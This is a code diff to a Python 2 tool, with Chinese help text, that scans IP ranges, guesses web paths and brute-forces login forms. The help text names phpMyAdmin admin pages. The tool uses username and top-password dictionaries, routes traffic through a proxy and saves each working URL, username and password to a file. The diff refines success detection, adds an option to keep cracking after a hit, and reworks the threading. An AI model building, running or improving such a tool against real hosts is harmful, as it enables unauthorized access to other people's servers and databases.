@@ -118,8 +118,6 @@ def getLivingHosgt(iplist):
             result.append(ip)
     return result
 
-#ipList = getLivingHosgt(ipList)
-
 def getDirList(dirs):
     result = []
     with open(dirs, 'r') as dirFile:
@@ -131,13 +129,31 @@ def getDirList(dirs):
     return result
 
 def isLoginSuccess(resp):
-#    sys.stdout.write('function isLoginSuccess...\n')
-    html = etree.HTML(resp.text)
-    options = html.xpath('//option')
-    if 100 < len(options):
-        return True
+    if 128 > len(resp.text):
+        return False
 
-    return False
+    actionUrl, cookies, userName, passwd, otherArgs = getLoginFormArgs(resp)
+    if (None != actionUrl and '' != actionUrl) and (None != userName and '' != userName) and (None != passwd and '' != passwd):
+        return False
+    else:
+        return True
+#    sys.stdout.write('function isLoginSuccess...\n')
+    #html = etree.HTML(resp.text)
+    #options = html.xpath('//option')
+    #if 100 < len(options):
+    #    return True
+    #else:
+    #    if resp.headers:
+    #        print resp.headers
+    #    if resp.text is not None:
+    #        print resp.text
+    #    if resp.content is not None:
+    #        print resp.content
+    #    return False
+
+
+    #return False
+
 
 def login(loginThreadConfig, url, cookies, userName, passwd, otherArgs):
 #    sys.stdout.write('function login...\n')
@@ -157,16 +173,14 @@ def login(loginThreadConfig, url, cookies, userName, passwd, otherArgs):
                 sys.stdout.write(colored('login:' + url + ' username:' + uL + ' passwd:' + pL + '\n', 'white'))
                 if 200 == resp.status_code or 302 == resp.status_code:
                     if True == isLoginSuccess(resp):
-                        sys.stdout.write(colored(url + ' [status_code:' + str(resp.status_code)+ '] [userName:' + uL + 'passwd:' + pL + ']''\n', 'green'))
+                        sys.stdout.write(colored(url + ' [status_code:' + str(resp.status_code)+ '] [userName:' + uL + ' passwd:' + pL + ']''\n', 'green'))
                         with open(loginThreadConfig['out'], 'a+') as outFile:
-                            outFile.writellines(url + '|' + uL + '|' + pL + '\n')
+                            outFile.writelines(url + '|' + uL + '|' + pL + '\n')
                             outFile.close()
-                        uL = usersFile.readline().strip()
-                        if None == uL or '' == nL:
-                            usersFile.close()
-                            passwdsFiles.close()
+                        if 'continue' == loginThreadConfig['fc']:
+                            break
+                        else:
                             return
-
                 pL = passwdsFiles.readline().strip()
 
             uL = usersFile.readline().strip()
@@ -241,6 +255,7 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
     loginThreadConfig['users'] = bruteDirThreadConfig['users']
     loginThreadConfig['passwds'] = bruteDirThreadConfig['passwds']
     loginThreadConfig['out'] = bruteDirThreadConfig['out']
+    loginThreadConfig['fc'] = bruteDirThreadConfig['fc']
 
     if False == isHostLiving(ipLine):
         return
@@ -333,71 +348,129 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
 
         url = ''
         urls = ''
+    
+    return
 
 def quit(signum, frame):
     sys.stdout.write(colored('Stop!\n','red'))
     sys.exit()
 
-def subWorkers(subIpList, dirList, bruteDirThreadConfig):
+def subWorkers(cpuCnt, subIpList, dirList, bruteDirThreadConfig):
     signal.signal(signal.SIGINT, quit)
     signal.signal(signal.SIGTERM, quit)
-    threads = []
-    for ipLine in subIpList:
-        try:
-            t = threading.Thread(target=bruteDir, args=(ipLine, dirList, bruteDirThreadConfig, ))
-            threads.append(t)
-        except Exception, e:
-            sys.stdout.write(str(e) + '\n')
+#    threads = []
+#    for ipLine in subIpList:
+#        try:
+#            t = threading.Thread(target=bruteDir, args=(ipLine, dirList, bruteDirThreadConfig, ))
+#            threads.append(t)
+#        except Exception, e:
+#            sys.stdout.write(str(e) + '\n')
+#
+#    try:
+#        for thread in threads:
+##            thread.setDaemon(True)
+#            thread.start()
+#            thread.join()
+#            #time.sleep(1)
+##        while True:
+##            pass
+#
+#    except Exception, e:
+#        sys.stdout.write(str(e) + '\n')
+#    return
 
-    try:
-        for thread in threads:
-            thread.setDaemon(True)
-            thread.start()
-            thread.join()
-            #time.sleep(1)
-#        while True:
-#            pass
+    times = len(subIpList) / cpuCnt
+    lastTimeCnt = len(subIpList) % cpuCnt
 
-    except Exception, e:
-        sys.stdout.write(str(e) + '\n')
+    
 
+    if 0 < lastTimeCnt:
+        times += 1
 
+    for i in range(times):
+        if (times - 1) != i:
+            for c in range(cpuCnt):
+                try:
+                    ipLine = subIpList.pop(0)
+                    thread = threading.Thread(target=bruteDir, args=(ipLine, dirList, bruteDirThreadConfig, ))
+                    thread.setDaemon(True)
+                    thread.start()
+                    thread.join()
+                except Exception, e:
+                    sys.stdout.write(str(e) + '\n')
+        else:
+            for t in range(lastTimeCnt):
+                try:
+                    ipLine = subIpList.pop(0)
+                    thread = threading.Thread(target=bruteDir, args=(ipLine, dirList, bruteDirThreadConfig, ))
+                    thread.setDaemon(True)
+                    thread.start()
+                    thread.join()
+                except Exception, e:
+                    sys.stdout.write(str(e) + '\n')
+
+    return
 
 
 if __name__ == '__main__':
+    
     parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, description='使用说明')
     parser.add_argument('-ipsf', help='指定目标ip 目标域名 目标ip:端口 目标域名:端口记录文件')
     parser.add_argument('-ipsb', help='指定目标ip段（如:1.2.3.4/24 或者 1.2.3.4-200）')
-    parser.add_argument('-dirs', help='爆破路径的字典文件.(默认: config/dirs-lists/comment-dirs.txt)')
-    parser.add_argument('-users', help='指定爆破登录时所用的用户名字典文件(默认: config/users-list/comment-users.txt)')
-    parser.add_argument('-passwds', help='指定爆破登录时所使用的密码字典文件.(默认: config/passwds-lists/comment-passwds.txt)')
-    parser.add_argument('-proxy', help='指定代理地址，不使用代理请指定参数为n. (默认: http://127.0.0.1:8118)')
-    parser.add_argument('-success', help='指定爆破登录成功时出现的一些特殊字符字典文件.(默认: comment-success.txt)')
-    parser.add_argument('-failed', help='指定爆破登录时失败时出现的一些特征字符字典文件.(默认: comment-failed.txt)')
-    parser.add_argument('-out', help='指定爆破登录成功后将登录URL和对应的用户名以及密码保存到文件.(默认:default-res.txt)')
-    parser.add_argument('-surl', help='指定保存在phpMyAdmin后台登陆的URL的文件.(默认: success-urls.txt)')
-    parser.add_argument('-logfile', help='指定保存日志的文件，不使用日志文件而时输出到终端的指定参数为n.(默认: log.txt)')
-    parser.add_argument('-ca', help='指定是否输出最终执行时的参数.[y/Y, n/N] y或者Y输出，否则不输出. (默认: y)')
-    parser.add_argument('-statCode', help='指定成功返回登录界面的状态码参数. (默认: 200)')
-    parser.add_argument('-StatCode', help='指定成功返回登录界面时的状态码文件。 (默认: 无)')
+
+    parser.add_argument('-dirs', default = "configs/dirs-lists/dir-list.txt",
+                                    help='爆破路径的字典文件.(默认: config/dirs-lists/comment-dirs.txt)')
+
+    parser.add_argument('-users', default = "configs/users-lists/users-list.txt",
+                                    help='指定爆破登录时所用的用户名字典文件(默认: config/users-list/comment-users.txt)')
+
+    parser.add_argument('-passwds', default = "configs/passwds-lists/top1001-password.txt",
+                                    help='指定爆破登录时所使用的密码字典文件.(默认: config/passwds-lists/comment-passwds.txt)')
+
+    parser.add_argument('-proxy', default = "http://127.0.0.1:8118",
+                                    help='指定代理地址，不使用代理请指定参数为n. (默认: http://127.0.0.1:8118)')
+
+    parser.add_argument('-success', default = "configs/success-list/comment-success.txt",
+                                    help='指定爆破登录成功时出现的一些特殊字符字典文件.(默认: comment-success.txt)')
+
+    parser.add_argument('-failed', default = "configs/failed-lists/comment-failed.txt",
+                                    help='指定爆破登录时失败时出现的一些特征字符字典文件.(默认: comment-failed.txt)')
+
+    parser.add_argument('-out', default = "url-user-passwd-pair.txt",
+                                    help='指定爆破登录成功后将登录URL和对应的用户名以及密码保存到文件.(默认:url-user-passwd-pair.txt)')
+
+    parser.add_argument('-surl', default = "success-urls.txt",
+                                    help='指定保存在phpMyAdmin后台登陆的URL的文件.(默认: success-urls.txt)')
+
+    logfile = "logs/" + time.strftime("%Y-%m-%d-%H:%M:%S", time.localtime()) + "-log.txt"
+    parser.add_argument('-logfile', default = logfile,
+                                    help='指定保存日志的文件，不使用日志文件而时输出到终端的指定参数为n.(默认: log.txt)')
+
+    parser.add_argument('-ca', default = 'y',
+                                    help='指定是否输出最终执行时的参数.[y/Y, n/N] y或者Y输出，否则不输出. (默认: y)')
+
+    parser.add_argument('-fc', default='exit', choices=['exit', 'continue'],
+                                    help='指定是否在爆破出一个用户名密码对之后就立即停止该ip的爆破')
+#    parser.add_argument('-statCode', help='指定成功返回登录界面的状态码参数. (默认: 200)')
+#    parser.add_argument('-StatCode', help='指定成功返回登录界面时的状态码文件。 (默认: 无)')
 
     args = parser.parse_args()
 
     ipsf = ''
-    dirs = "configs/dirs-lists/dir-list.txt"
-    users = "configs/users-lists/users-list.txt"
-    passwds = "configs/passwds-lists/top1001-password.txt"
-    proxy = "http://127.0.0.1:8118"
-    success = "configs/success-list/comment-success.txt"
-    failed = "configs/failed-lists/comment-failed.txt"
-    out = "default-res.txt"
-    surl = "success-urls.txt"
-    logfile = "logs/" + time.strftime("%Y-%m-%d-%H:%M:%S", time.localtime()) + "-log.txt"
-    ca = 'y'
-    statCode = '200,301'
-    StatCode = ''
-
     ipList = []
+
+#    dirs = "configs/dirs-lists/dir-list.txt"
+#    users = "configs/users-lists/users-list.txt"
+#    passwds = "configs/passwds-lists/top1001-password.txt"
+#    proxy = "http://127.0.0.1:8118"
+#    success = "configs/success-list/comment-success.txt"
+#    failed = "configs/failed-lists/comment-failed.txt"
+#    out = "default-res.txt"
+#    surl = "success-urls.txt"
+#    ca = 'y'
+#    statCode = '200,301'
+#    StatCode = ''
+
 
     if args.ipsf is None and args.ipsb is None:
         print "至少给定ipsf（用以指定ip列表文件）或者ipsb（参数用以指定ip地址段）"
@@ -419,43 +492,43 @@ if __name__ == '__main__':
         ipsb = args.ipsb
         ipList = genIpList(ipsb)
 
-    if args.dirs:
-        dirs = args.dirs
+#    if args.dirs:
+#        dirs = args.dirs
+#
+#    if args.users:
+#        users =args.users
+#
+#    if args.passwds:
+#        passwds = args.passwds
+#
+#    if args.proxy:
+#        proxy = args.proxy
+#
+#    if args.success:
+#        success = args.success
+#
+#    if args.failed:
+#        failed = args.failed
+#
+#    if args.out:
+#        out = args.out
+#
+#    if args.surl:
+#        surl = args.surl
+#
+#    if args.logfile:
+#       logfile = args.logfile
+#
+#    if args.ca:
+#        ca = args.ca
 
-    if args.users:
-        users =args.users
+#    if args.statCode:
+#        statCode = args.statCode
+#
+#    if args.StatCode:
+#        StatCode = args.StatCode
 
-    if args.passwds:
-        passwds = args.passwds
-
-    if args.proxy:
-        proxy = args.proxy
-
-    if args.success:
-        success = args.success
-
-    if args.failed:
-        failed = args.failed
-
-    if args.out:
-        out = args.out
-
-    if args.surl:
-        surl = args.surl
-
-    if args.logfile:
-       logfile = args.logfile
-
-    if args.ca:
-        ca = args.ca
-
-    if args.statCode:
-        statCode = args.statCode
-
-    if args.StatCode:
-        StatCode = args.StatCode
-
-    dirList = getDirList(dirs)
+    dirList = getDirList(args.dirs)
     
     signal.signal(signal.SIGINT, quit)
     signal.signal(signal.SIGTERM, quit)
@@ -466,11 +539,12 @@ if __name__ == '__main__':
     lastProJobCnt = (len(ipList) / cpuCnt) + (len(ipList) % cpuCnt)
     
     bruteDirThreadConfig = {}
-    #bruteDirThreadConfig['dirs'] = dirs
-    bruteDirThreadConfig['users'] = users
-    bruteDirThreadConfig['passwds'] = passwds
-    bruteDirThreadConfig['surl'] = surl
-    bruteDirThreadConfig['out'] = out
+    bruteDirThreadConfig['dirs'] = args.dirs
+    bruteDirThreadConfig['users'] = args.users
+    bruteDirThreadConfig['passwds'] = args.passwds
+    bruteDirThreadConfig['surl'] = args.surl
+    bruteDirThreadConfig['fc'] = args.fc
+    bruteDirThreadConfig['out'] = args.out
     
     for cpuIndex in range(cpuCnt):
         subIpList = []
@@ -478,7 +552,7 @@ if __name__ == '__main__':
             for i in range(eachProJobCnt):
                subIpList.append(ipList.pop(0))
 
-            pool.apply_async(subWorkers, args=(subIpList, dirList, bruteDirThreadConfig, ))
+            pool.apply_async(subWorkers, args=(cpuCnt, subIpList, dirList, bruteDirThreadConfig, ))
             
         else:
             for i in range(lastProJobCnt):
